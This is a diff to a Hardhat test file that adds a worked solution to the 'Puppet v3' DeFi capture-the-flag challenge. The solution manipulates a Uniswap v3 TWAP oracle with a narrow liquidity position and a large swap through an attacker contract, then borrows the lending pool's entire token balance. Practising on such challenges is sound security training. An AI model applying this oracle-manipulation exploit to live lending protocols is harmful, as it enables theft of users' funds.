@@ -34,7 +34,7 @@ describe("[Challenge] Puppet v3", function () {
   let initialBlockTimestamp;
 
   /** SET RPC URL HERE */
-  const MAINNET_FORKING_URL = "";
+  const MAINNET_FORKING_URL = process.env.URL;
 
   // Initial liquidity amounts for Uniswap v3 pool
   const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -193,7 +193,85 @@ describe("[Challenge] Puppet v3", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
-    // since the liquidity is allocated to such a narrow range we might be able to move the price out of the range. if it is possible, then we could create a position at a very low price. then we have to figure out how the observation is recorded.
+    // since the liquidity is allocated to such a narrow range we might be able to move the price out of the range. if it is possible, then we could create a position at a very low price. then we have to figure out how the observations are recorded.
+
+    const token0 = await uniswapPool.token0();
+    expect(token0.toLowerCase()).to.eq(weth.address.toLowerCase());
+
+    // we will setup a position with the maximum price of eth and a make a swap to reach that price range.
+    await weth.connect(player).deposit({ value: 1000 });
+    expect(await weth.balanceOf(player.address)).to.eq(1000);
+
+    const attacker = await (
+      await ethers.getContractFactory("Puppetv3Attacker", player)
+    ).deploy(uniswapPool.address, weth.address, token.address);
+    await weth
+      .connect(player)
+      .approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
+
+    // the ticks must be exact multiple of 60
+    await uniswapPositionManager.connect(player).mint(
+      {
+        token0: weth.address,
+        token1: token.address,
+        tickLower: 887160,
+        tickUpper: 887220,
+        fee: 3000,
+        recipient: player.address,
+        amount0Desired: 1000,
+        amount1Desired: 0,
+        amount0Min: 0,
+        amount1Min: 0,
+        deadline: (await ethers.provider.getBlock("latest")).timestamp * 2,
+      },
+      { gasLimit: 5000000 }
+    );
+
+    await token
+      .connect(player)
+      .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+    const beforeSwapWETHRequired =
+      await lendingPool.calculateDepositOfWETHRequired(
+        LENDING_POOL_INITIAL_TOKEN_BALANCE
+      );
+    await attacker.doSwap(
+      player.address,
+      false,
+      -UNISWAP_INITIAL_WETH_LIQUIDITY - 5n,
+      2n ** 159n,
+      "0x"
+    );
+    const currentTimeStamp = (await ethers.provider.getBlock("latest"))
+      .timestamp;
+    console.log(
+      "Already elapsed time",
+      currentTimeStamp - initialBlockTimestamp
+    );
+    await time.increase(100);
+    const afterSwapWETHRequired =
+      await lendingPool.calculateDepositOfWETHRequired(
+        LENDING_POOL_INITIAL_TOKEN_BALANCE
+      );
+
+    console.log("Before swap required weth:", beforeSwapWETHRequired);
+    console.log("After swap required weth:", afterSwapWETHRequired);
+
+    const currentWethAmount = await weth.balanceOf(player.address);
+
+    console.log("Current weth balance", currentWethAmount);
+    console.log("Needed weth", afterSwapWETHRequired);
+
+    if (currentWethAmount.gt(afterSwapWETHRequired)) {
+      console.log("Success");
+    }
+
+    await weth
+      .connect(player)
+      .approve(lendingPool.address, ethers.constants.MaxUint256);
+    await lendingPool
+      .connect(player)
+      .borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
   });
 
   after(async function () {
